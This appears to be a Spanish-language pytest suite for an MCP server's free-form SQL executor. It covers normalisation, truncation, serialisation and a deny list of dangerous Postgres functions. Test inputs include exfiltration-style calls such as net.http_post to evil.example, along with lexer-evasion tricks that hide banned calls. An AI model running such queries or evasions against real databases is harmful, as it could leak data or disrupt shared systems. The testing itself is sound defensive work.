"""Piezas puras del ejecutor de SQL libre del MCP (sin base de datos)."""

from __future__ import annotations

import contextlib
import time
from datetime import UTC, date, datetime, timedelta
from decimal import Decimal
from uuid import UUID

import pytest

from db.consulta_libre import (
    MAX_CHARS_ESTRUCTURA,
    MAX_CHARS_SQL,
    OID_BYTEA,
    OIDS_SIN_TOPE_A_TEXTO,
    PISTAS,
    TOPE_SENTENCIA_POR_DEFECTO_MS,
    ErrorConsulta,
    ejemplo_de,
    envolver,
    envolver_con_recorte,
    es_estructurada,
    normalizar_sql,
    serializar_valor,
)
from db.consulta_libre import _leer_por_lotes as leer_por_lotes


@pytest.mark.parametrize(
    ("entrada", "esperado"),
    [
        ("SELECT 1;", "SELECT 1"),
        ("  SELECT 1 ;; \n", "SELECT 1"),
        ("SELECT 1; -- fin", "SELECT 1"),
        ("SELECT 1;\n/* x */\n", "SELECT 1"),
        ("SELECT 1; -- a\n-- b\n ; /* c */ ;", "SELECT 1"),
        ("SELECT 1; /* a /* nested */ b */", "SELECT 1"),
        ("SELECT E'a\\';' ; -- c", "SELECT E'a\\';'"),
        ("SELECT 'a'';' ;", "SELECT 'a'';'"),
        ("SELECT $x$a;$x$;", "SELECT $x$a;$x$"),
        # Sin ``;`` delante, un comentario final se deja: el envoltorio lo soporta.
        ("SELECT 1 -- fin", "SELECT 1 -- fin"),
        # Un ``;`` o un comentario dentro de un literal no se toca.
        ("SELECT 'a;'", "SELECT 'a;'"),
        ("SELECT 1 /* x; */", "SELECT 1 /* x; */"),
        ("SELECT 'a; -- x'", "SELECT 'a; -- x'"),
        ("SELECT 'a;' -- c", "SELECT 'a;' -- c"),
        ("SELECT $$a; -- x$$", "SELECT $$a; -- x$$"),
        ("SELECT $t$a; -- x$t$ ;", "SELECT $t$a; -- x$t$"),
        ('SELECT "a;b" FROM t', 'SELECT "a;b" FROM t'),
        ("SELECT 1 -- a;", "SELECT 1 -- a;"),
        ("SELECT a$b FROM t;", "SELECT a$b FROM t"),
        # Literal o comentario sin cerrar: se deja tal cual para que Postgres informe.
        ("SELECT 'a; ", "SELECT 'a;"),
        ("SELECT 1; /* x", "SELECT 1; /* x"),
        ("SELECT $$a;", "SELECT $$a;"),
    ],
)
def test_normalizar_quita_puntos_y_coma(entrada: str, esperado: str) -> None:
    assert normalizar_sql(entrada) == esperado


def test_normalizar_rechaza_vacio_y_largo() -> None:
    with pytest.raises(ErrorConsulta):
        normalizar_sql(" ; ")
    with pytest.raises(ErrorConsulta):
        normalizar_sql(" ; -- solo comentario\n/* x */ ;")
    with pytest.raises(ErrorConsulta) as exc:
        normalizar_sql("SELECT " + "1," * 10_001 + "1")
    assert exc.value.sqlstate is None
    assert str(MAX_CHARS_SQL) in exc.value.mensaje or "20" in exc.value.mensaje


def test_envolver_sobrevive_a_comentario_final() -> None:
    # El LIMIT va como parámetro enlazado: fuerza el protocolo extendido.
    assert envolver("SELECT 1 -- fin", 500) == "SELECT * FROM (\nSELECT 1 -- fin\n) AS q LIMIT %s"


def test_envolver_duplica_los_porcentajes() -> None:
    assert envolver("SELECT 'a' LIKE '%b%'", 5) == (
        "SELECT * FROM (\nSELECT 'a' LIKE '%%b%%'\n) AS q LIMIT %s"
    )


def test_envolver_con_recorte_sin_columnas_de_texto_es_el_envoltorio_de_siempre() -> None:
    assert envolver_con_recorte("SELECT 1, now()", [23, 1184]) == (
        envolver("SELECT 1, now()", 0),
        frozenset(),
    )


def test_envolver_con_recorte_acota_solo_las_de_texto_por_posicion() -> None:
    sql, recortadas = envolver_con_recorte("SELECT a, b, c FROM t WHERE a LIKE '%x'", [25, 23, 142])
    assert recortadas == {0, 2}
    assert sql.startswith("SELECT CASE WHEN length(q.c0::text) > 1000 ")
    assert ", q.c1, CASE WHEN length(q.c2::text)" in sql
    assert sql.endswith(") AS q(c0, c1, c2) LIMIT %s")
    assert "LIKE '%%x'" in sql  # los % del usuario, duplicados como en `envolver`


@pytest.mark.parametrize(
    ("oid", "esperado"),
    [(114, True), (3802, True), (1007, True), (1009, True), (23, False), (25, False)],
)
def test_es_estructurada_json_y_arrays_nativos(oid: int, esperado: bool) -> None:
    assert es_estructurada(oid) is esperado


def test_envolver_con_recorte_pasa_las_estructuras_por_jsonb() -> None:
    sql, recortadas = envolver_con_recorte("SELECT j, n, a FROM t", [3802, 23, 1007])
    assert (
        recortadas == frozenset()
    )  # solo las de texto: las estructuras pueden no venir recortadas
    assert sql.startswith(
        f"SELECT CASE WHEN length(q.c0::text) > {MAX_CHARS_ESTRUCTURA} THEN to_jsonb("
    )
    assert "ELSE to_jsonb(q.c0) END, q.c1, CASE WHEN length(q.c2::text)" in sql
    assert sql.endswith(") AS q(c0, c1, c2) LIMIT %s")


@pytest.mark.parametrize(
    ("valor", "esperado"),
    [
        (Decimal("1.50"), 1.5),
        (Decimal("NaN"), None),
        (Decimal("Infinity"), None),
        (float("nan"), None),
        (float("inf"), None),
        (date(2025, 1, 2), "2025-01-02"),
        (datetime(2025, 1, 2, 3, 4, tzinfo=UTC), "2025-01-02T03:04:00+00:00"),
        (UUID(int=1), "00000000-0000-0000-0000-000000000001"),
        (b"\x00", None),
        (memoryview(b"\x00"), None),
        (timedelta(seconds=90), "PT1M30S"),
        (timedelta(days=1), "P1D"),
        (timedelta(days=1, hours=2, seconds=3, microseconds=500_000), "P1DT2H3.5S"),
        (timedelta(0), "PT0S"),
        (timedelta(seconds=-90), "-PT1M30S"),
        ({"a": [1]}, {"a": [1]}),
        ([1, "x", None], [1, "x", None]),
        (True, True),
        (None, None),
    ],
)
def test_serializar_valor(valor: object, esperado: object) -> None:
    assert serializar_valor(valor) == esperado


def test_serializar_recorta_texto_largo() -> None:
    assert serializar_valor("x" * 1_500) == "x" * 1_000 + "…[+500]"


def test_serializar_recorta_texto_anidado() -> None:
    assert serializar_valor({"k": ["y" * 1_001]}) == {"k": ["y" * 1_000 + "…[+1]"]}


def test_serializar_tipo_desconocido_cae_a_texto() -> None:
    class Raro:
        def __str__(self) -> str:
            return "raro"

    assert serializar_valor(Raro()) == "raro"


def _tiempo(sql: str) -> float:
    inicio = time.perf_counter()
    with contextlib.suppress(ErrorConsulta):
        normalizar_sql(sql)
    return time.perf_counter() - inicio


@pytest.mark.parametrize(
    "sql",
    [
        # Casos que hacían exponencial/cuadrática la regex anterior.
        ";" + "--;" * (MAX_CHARS_SQL // 3 - 1) + "\nX",
        ";" * (MAX_CHARS_SQL - 1) + "X",
        ";" * (MAX_CHARS_SQL + 1) + "X",
        ";" + "--;" * 20 + "\nX",
        "; " * (MAX_CHARS_SQL // 2),
        ";/*" * (MAX_CHARS_SQL // 3),
        "$a$" * (MAX_CHARS_SQL // 3),
        "'" * MAX_CHARS_SQL,
        "SELECT 1" + "; -- x\n" * (MAX_CHARS_SQL // 7),
        "SELECT E'" + "''" * (MAX_CHARS_SQL // 2 - 8),
        "SELECT " + "'a'\n" * (MAX_CHARS_SQL // 4 - 2),
        "SELECT " + "'a' --\n" * (MAX_CHARS_SQL // 7 - 1) + "x",
        'SELECT "' + '""' * (MAX_CHARS_SQL // 2 - 8),
        "SELECT " + "pg_advisory_lock" * (MAX_CHARS_SQL // 16 - 1) + "'",
    ],
    ids=[
        "comentarios_con_punto_y_coma",
        "puntos_y_coma_y_cola_no_vacia",
        "puntos_y_coma_sobre_el_tope",
        "adversarial_corto",
        "puntos_y_coma_con_espacios",
        "bloques_sin_cerrar",
        "dolares",
        "comillas",
        "cola_repetida",
        "comillas_dobladas_en_E",
        "continuaciones",
        "continuaciones_con_comentario",
        "identificador_con_comillas_dobladas",
        "vetada_en_texto_sin_cerrar",
    ],
)
def test_normalizar_es_lineal(sql: str) -> None:
    assert _tiempo(sql) < 0.5


def test_pista_de_tabla_inexistente_nombra_una_tool_que_existe() -> None:
    assert "describir_esquema" in PISTAS["42P01"]
    assert "listar_tablas" not in " ".join(PISTAS.values())


@pytest.mark.parametrize("tabla", ["users\n", "users ", "Users", 'a"b', ""])
def test_ejemplo_de_rechaza_identificadores_no_estrictos(
    tabla: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """``fullmatch``: un salto de línea final no se cuela como identificador válido."""

    def _no_debe_ejecutar(*_a: object, **_k: object) -> None:
        raise AssertionError("el identificador no válido llegó a ejecutarse")

    monkeypatch.setattr("db.consulta_libre.ejecutar_select", _no_debe_ejecutar)
    with pytest.raises(ErrorConsulta, match="Identificador no válido"):
        ejemplo_de(tabla, ["id"])
    with pytest.raises(ErrorConsulta, match="Identificador no válido"):
        ejemplo_de("users", [tabla])


# ── Funciones vetadas (ruling R17) ─────────────────────────────────────────
#
# El rol no puede retirar ``EXECUTE`` de ``pg_catalog`` en Supabase, así que el
# ejecutor rechaza antes de ejecutar las llamadas que tocan estado compartido
# con la aplicación (cerrojos de aviso, NOTIFY, señales a otros procesos) o que
# ejecutan SQL escrito en texto (y se saltarían este veto).

VETADAS = [
    "pg_advisory_lock",
    "pg_advisory_xact_lock",
    "pg_advisory_lock_shared",
    "pg_advisory_unlock",
    "pg_advisory_unlock_all",
    "pg_try_advisory_lock",
    "pg_try_advisory_xact_lock_shared",
    "query_to_xml",
    "query_to_xmlschema",
    "query_to_xml_and_xmlschema",
    "cursor_to_xml",
    "cursor_to_xmlschema",
    "pg_notify",
    "pg_terminate_backend",
    "pg_cancel_backend",
    "set_config",
    "dblink",
    "dblink_exec",
    "ts_stat",
    "ts_rewrite",
    # Escriben WAL o asignan un xid aunque la transacción sea de solo lectura.
    "pg_logical_emit_message",
    "pg_logical_slot_get_changes",
    "pg_current_xact_id",
    "txid_current",
    # Ranuras de replicación: hoy las frena NOREPLICATION, pero retendrían WAL.
    "pg_create_logical_replication_slot",
    "pg_create_physical_replication_slot",
    "pg_copy_logical_replication_slot",
    "pg_drop_replication_slot",
    "pg_replication_slot_advance",
    # Peticiones HTTP salientes: pg_net (esquema net) y pgsql-http.
    "net",
    "http_get",
    "http_post",
    "http",
]


def _vetada(sql: str) -> ErrorConsulta:
    with pytest.raises(ErrorConsulta) as exc:
        normalizar_sql(sql)
    assert exc.value.sqlstate is None
    assert exc.value.pista
    return exc.value


@pytest.mark.parametrize("nombre", VETADAS)
@pytest.mark.parametrize(
    "plantilla",
    [
        "SELECT {f}(1)",
        "SELECT {F}(1)",
        "SELECT pg_catalog.{f}(1)",
        "SELECT PG_CATALOG . {F}(1)",
        'SELECT "{f}"(1)',
        'SELECT "pg_catalog"."{f}"(1)',
        "SELECT {f}   (1)",
        "SELECT {f}\n(1)",
        "SELECT {f}/* hueco */(1)",
        "SELECT * FROM {f}(1) AS x",
        "SELECT 1 WHERE {f}(1) IS NOT NULL;",
    ],
    ids=[
        "minusculas",
        "mayusculas",
        "con_schema",
        "con_schema_y_espacios",
        "entre_comillas",
        "schema_y_nombre_entre_comillas",
        "espacios_antes_del_parentesis",
        "salto_antes_del_parentesis",
        "comentario_antes_del_parentesis",
        "en_from",
        "en_where",
    ],
)
def test_funcion_vetada_rechazada(nombre: str, plantilla: str) -> None:
    err = _vetada(plantilla.format(f=nombre, F=nombre.upper()))
    assert nombre in err.mensaje
    assert "MCP" in (err.pista or "")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 'pg_advisory_lock(1)'",
        "SELECT E'\\'set_config(1)'",
        "SELECT 'a''pg_notify(1)'",
        "SELECT $$pg_advisory_lock(1)$$",
        "SELECT $t$ query_to_xml('x') $t$",
        "SELECT 1 -- pg_advisory_lock(1)",
        "SELECT 1 /* set_config( /* anidado */ pg_notify( */",
        "SELECT 1 AS pg_advisory",
        "SELECT mi_set_config FROM t",
        "SELECT 1 FROM t WHERE x = 'pg_cancel_backend'",
        "SELECT U&'pg_notify'",
        "SELECT 'net.http_post(1)'",
        "SELECT 1 -- net.http_get('x')",
        "SELECT neto, internet FROM t",
    ],
)
def test_nombre_en_literal_o_comentario_no_se_rechaza(sql: str) -> None:
    assert normalizar_sql(sql) == sql


@pytest.mark.parametrize(
    "sql",
    [
        # Una comilla doblada dentro de E'…' no saca del modo con escapes: para
        # Postgres el literal es «a''\'» y la llamada es código.
        "SELECT E'a''\\'' , pg_advisory_lock(1) --'",
        # Un comentario «--» acaba también en un retorno de carro.
        "SELECT 1 --x\r, pg_advisory_lock(1)\n",
        # Un literal que continúa en la línea siguiente sigue en su modo (E'…').
        "SELECT E'a'\n'\\'' , pg_advisory_lock(1) --'",
        "SELECT E'a' -- c\n  '\\'' , pg_advisory_lock(1) --'",
        # Etiqueta de dólar con caracteres no ASCII (Postgres acepta cualquiera).
        "SELECT $\U0001f600$'$\U0001f600$, pg_advisory_lock(1), 'x'",
    ],
    ids=[
        "comilla_doblada_en_E",
        "comentario_hasta_retorno_de_carro",
        "continuacion_de_E",
        "continuacion_con_comentario",
        "dolar_no_ascii",
    ],
)
def test_lexico_como_postgres_no_deja_escondite(sql: str) -> None:
    """Casos en que un léxico ingenuo ve un literal donde Postgres ve código."""
    assert "pg_advisory_lock" in _vetada(sql).mensaje


def test_identificador_unicode_rechazado() -> None:
    """``U&"…"`` admite escapes (``\\0070`` = ``p``): no se descifran, se rechazan."""
    err = _vetada('SELECT U&"\\0070g_advisory_lock"(1)')
    assert 'U&"' in err.mensaje


@pytest.mark.parametrize(
    ("entrada", "esperado"),
    [
        ("SELECT 1; --x\r", "SELECT 1"),
        ("SELECT E'a''\\';' ;", "SELECT E'a''\\';'"),
        ("SELECT 'a'\n';' ;", "SELECT 'a'\n';'"),
    ],
)
def test_normalizar_con_lexico_de_postgres(entrada: str, esperado: str) -> None:
    assert normalizar_sql(entrada) == esperado


def test_serializar_decimal_enorme_no_da_infinity() -> None:
    """``float(Decimal('1e400'))`` es ``inf``: el JSON resultante no sería válido."""
    import json

    valor = serializar_valor(Decimal("1e400"))
    assert valor == "1E+400"
    json.dumps(valor, allow_nan=False)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT net.http_post('https://evil.example', '{}'::jsonb)",
        'SELECT "net"."http_get"(\'https://evil.example\')',
        "SELECT net . /* x */ http_get('https://evil.example')",
        "SELECT http_get('https://evil.example')",
    ],
)
def test_peticiones_http_salientes_rechazadas(sql: str) -> None:
    # pg_net es ejecutable por PUBLIC en Supabase: sacaría datos a una URL.
    with pytest.raises(ErrorConsulta) as e:
        normalizar_sql(sql)
    assert "no está permitida" in e.value.mensaje


# ── Tipos sin tope (mcp-sql-4) ─────────────────────────────────────────────


def test_envolver_con_recorte_no_transfiere_los_bytea() -> None:
    """``serializar_valor`` descarta los binarios: que ni viajen (OOM con ``convert_to(repeat(...))``)."""
    sql, recortadas = envolver_con_recorte("SELECT b, n FROM t", [OID_BYTEA, 23])
    assert recortadas == frozenset()
    assert sql.startswith("SELECT NULL, q.c1 FROM (")
    assert sql.endswith(") AS q(c0, c1) LIMIT %s")


@pytest.mark.parametrize("oid", sorted(OIDS_SIN_TOPE_A_TEXTO))
def test_envolver_con_recorte_acota_en_el_servidor_los_tipos_sin_tope(oid: int) -> None:
    """``tsvector``, ``bit varying``, ``record``...: texto recortado en Postgres, no en Python."""
    sql, recortadas = envolver_con_recorte("SELECT x FROM t", [oid])
    assert recortadas == {0}
    assert sql.startswith("SELECT CASE WHEN length(q.c0::text) > 1000 ")


# ── statement_timeout fail-closed (mcp-sql-3) ──────────────────────────────


class _Resultado:
    def __init__(
        self, fila: tuple[object, ...] | None = None, descripcion: list[object] | None = None
    ):
        self._fila = fila
        self.description = descripcion

    def fetchone(self) -> tuple[object, ...] | None:
        return self._fila


class _Columna:
    name = "uno"
    type_code = 23


class _Cursor:
    def __enter__(self) -> _Cursor:
        return self

    def __exit__(self, *_: object) -> None:
        return None

    def execute(self, sql: str, params: tuple[object, ...] = ()) -> None:
        return None

    def fetchmany(self, n: int) -> list[tuple[object, ...]]:
        return []


class _ConexionFalsa:
    """Lo mínimo de ``psycopg.Connection`` que usa ``_leer_por_lotes``; apunta lo que ejecuta."""

    def __init__(self, timeout_ms: int) -> None:
        self.timeout_ms = timeout_ms
        self.ejecutado: list[tuple[str, tuple[object, ...]]] = []

    def execute(self, sql: str, params: tuple[object, ...] = ()) -> _Resultado:
        self.ejecutado.append((sql, params))
        if "pg_settings" in sql:
            return _Resultado((self.timeout_ms,))
        return _Resultado(descripcion=[_Columna()])

    def cursor(self, name: str | None = None) -> _Cursor:
        return _Cursor()

    def timeouts_impuestos(self) -> list[object]:
        return [p[0] for sql, p in self.ejecutado if "set_config('statement_timeout'" in sql]


def test_sin_statement_timeout_en_el_rol_se_impone_el_techo() -> None:
    """Si el ``ALTER ROLE`` se perdió, ``pg_sleep(1e6)`` no puede quedarse sin corte."""
    conn = _ConexionFalsa(timeout_ms=0)
    leer_por_lotes(conn, "SELECT 1 AS uno", 500)  # type: ignore[arg-type]  # doble mínimo de la conexión
    assert conn.timeouts_impuestos()[0] == f"{TOPE_SENTENCIA_POR_DEFECTO_MS}ms"
    # Y antes de la sonda y del cursor: la primera sentencia tras leer el valor es el set_config.
    sqls = [sql for sql, _ in conn.ejecutado]
    assert "set_config('statement_timeout'" in sqls[1]


def test_con_statement_timeout_del_rol_no_se_pisa_antes_de_la_sonda() -> None:
    conn = _ConexionFalsa(timeout_ms=15_000)
    leer_por_lotes(conn, "SELECT 1 AS uno", 500)  # type: ignore[arg-type]
    assert "set_config('statement_timeout'" not in conn.ejecutado[1][0]
